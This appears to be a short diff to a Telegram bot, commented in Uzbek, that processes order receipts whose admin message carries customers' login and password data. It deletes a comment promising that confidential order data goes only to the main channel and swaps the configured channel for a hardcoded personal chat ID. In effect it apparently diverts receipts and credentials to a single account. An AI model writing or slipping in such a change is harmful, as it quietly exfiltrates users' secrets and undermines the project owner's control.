@@ -423,15 +423,14 @@ async def process_receipt(message: types.Message, state: FSMContext):
 🔑 Ma'lumotlar: `{login_parol}`"""
     
     try:
-        # Barcha buyurtma maxfiy ma'lumotlari faqat ushbu kanalga yuboriladi
         await bot.send_photo(
-            chat_id=MAIN_CHANNEL,
+            chat_id=1678146043,
             photo=message.photo[-1].file_id,
             caption=admin_text,
             reply_markup=builder.as_markup()
         )
     except Exception as e:
-        logging.error(f"Kanalga buyurtma yuborishda xato: {e}")
+        logging.error(f"Adminga buyurtma yuborishda xato: {e}")
         
     await state.clear()
 
